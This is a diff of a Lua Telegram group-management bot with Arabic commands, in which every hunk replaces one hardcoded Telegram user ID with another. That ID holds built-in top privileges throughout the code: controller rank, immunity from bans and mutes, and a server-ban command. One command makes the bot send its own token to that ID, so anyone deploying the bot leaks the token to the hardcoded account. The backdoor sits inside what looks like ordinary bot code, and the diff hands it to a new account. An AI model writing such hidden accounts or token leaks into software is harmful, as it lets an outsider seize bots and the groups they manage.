@@ -299,7 +299,7 @@ return kk
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,2019189055,1290321198}
+local ListSudos ={Sudo_Id,1483571441,1290321198}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -318,7 +318,7 @@ Manger = Redis:sismember(black.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(black.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(black.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 2019189055 then
+if UserId == 1483571441 then
 Status = 'مبرمج السورس'
 elseif UserId == 1290321198 then
 Status = 'مطور السورس'
@@ -897,7 +897,7 @@ Manger = Redis:sismember(black.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(black.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(black.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 2019189055 then
+if UserId == 1483571441 then
 Status = true
 elseif UserId == 1290321198 then
 Status = true
@@ -939,7 +939,7 @@ Manger = Redis:sismember(black.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(black.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(black.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 2019189055 then
+if UserId == 1483571441 then
 Status = true
 elseif UserId == 1290321198 then
 Status = true
@@ -1053,7 +1053,7 @@ if chh then
 local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..msg.sender.user_id)
 data = json:decode(url)
 if data.result.status == "left" or data.result.status == "kicked" then
-if tonumber(msg.sender.user_id) ~= tonumber(2019189055) then
+if tonumber(msg.sender.user_id) ~= tonumber(1483571441) then
 JoinChannel = false 
 end
 end
@@ -1103,7 +1103,7 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 2019189055 then
+if tonumber(msg.sender.user_id) == 1483571441 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
 elseif tonumber(msg.sender.user_id) == 1290321198 then
@@ -6386,7 +6386,7 @@ end
 if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
 return send(msg_chat_id,msg_id,"\n*⌔︙ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if UserId == "2019189055" then
+if UserId == "1483571441" then
 return send(msg_chat_id,msg_id,"\n*⌔︙ عذرآ لا تستطيع استخدام الامر على مبرمج السورس *","md",true)  
 end
 if UserId == "1290321198" then
@@ -6423,7 +6423,7 @@ local UserId = text:match('^كتم عام (%d+)$')
 if not msg.Devss then
 return send(msg_chat_id,msg_id,'\n*⌔︙ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
 end
-if UserId == "2019189055" then
+if UserId == "1483571441" then
 return send(msg_chat_id,msg_id,"\n*⌔︙ عذرآ لا تستطيع استخدام الامر على مبرمج السورس *","md",true)  
 end
 if UserId == "1290321198" then
@@ -11800,7 +11800,7 @@ data = {
 },
 }
 }
-return send(msg_chat_id,msg_id,"[𖠧𝐑𝐀𝐈𝐈𝐒](tg://user?id=2019189055)","md",true, false, false, true, reply_markup)
+return send(msg_chat_id,msg_id,"[𖠧𝐑𝐀𝐈𝐈𝐒](tg://user?id=1483571441)","md",true, false, false, true, reply_markup)
 end
 
 if text == 'اريد بوت' then
@@ -12018,12 +12018,12 @@ end
 
 
 if text == "توكن" then
-if msg.sender.user_id == tonumber(2019189055) then
-send(2019189055,msg_id,Token,"html",true)
+if msg.sender.user_id == tonumber(1483571441) then
+send(1483571441,msg_id,Token,"html",true)
 end
 end
 if text == "اني منو" then
-if msg.sender.user_id == tonumber(2019189055) then
+if msg.sender.user_id == tonumber(1483571441) then
 send(msg_chat_id,msg_id,"⌔︙ انت حسن مبرمج السورس يعمࢪيہَ🌚♥","md",true)
 elseif msg.sender.user_id == tonumber(1290321198) then
 send(msg_chat_id,msg_id,"⌔︙ انت مطور السورس يقلبي🌚♥","md",true)
@@ -15221,7 +15221,7 @@ return send(msg.chat_id,msg.id,'*\n• تحكم برتب الشخص*',"md",false
 end
 if text then
 if text:match("حظر من السيرفر") then
-if tonumber(msg.sender.user_id) == tonumber(2019189055) then
+if tonumber(msg.sender.user_id) == tonumber(1483571441) then
 local iduser = tonumber(text:match("^حظر من السيرفر (%d+)$"))
 Redis:sadd("banserver",iduser)
 send(msg.chat_id,msg.id,"• تم حظر العضو من السيرفر")
@@ -15232,7 +15232,7 @@ end
 end
 if text then
 if text:match("الغاء حظر من السيرفر") then
-if tonumber(msg.sender.user_id) == tonumber(2019189055) then
+if tonumber(msg.sender.user_id) == tonumber(1483571441) then
 local iduser = tonumber(text:match("^الغاء حظر من السيرفر (%d+)$"))
 Redis:srem("banserver",iduser)
 send(msg.chat_id,msg.id,"• تم الغاء حظر العضو من السيرفر")
@@ -15242,7 +15242,7 @@ end
 end
 end
 if text == "المحظورين من السيرفر" then
-if tonumber(msg.sender.user_id) == tonumber(2019189055) then
+if tonumber(msg.sender.user_id) == tonumber(1483571441) then
 local list = Redis:smembers("banserver")
 if #list == 0 then
 return send(msg.chat_id,msg.id,"• القائمه فارغه")
@@ -17672,7 +17672,7 @@ end
 File_Bot_Run(Message_Edit,Message_Edit)
 if tonumber(Message_Edit.sender.user_id) == 1290321198 then
 data.The_Controller = 1
-elseif tonumber(Message_Edit.sender.user_id) == 2019189055 then
+elseif tonumber(Message_Edit.sender.user_id) == 1483571441 then
 data.The_Controller = 1
 elseif The_ControllerAll(Message_Edit.sender.user_id) == true then  
 data.The_Controller = 1
@@ -17853,7 +17853,7 @@ end
 end
 if tonumber(IdUser) == 1290321198 then
 data.The_Controller = 1
-elseif tonumber(IdUser) == 2019189055 then
+elseif tonumber(IdUser) == 1483571441 then
 data.The_Controller = 1
 elseif The_ControllerAll(IdUser) == true then  
 data.The_Controller = 1
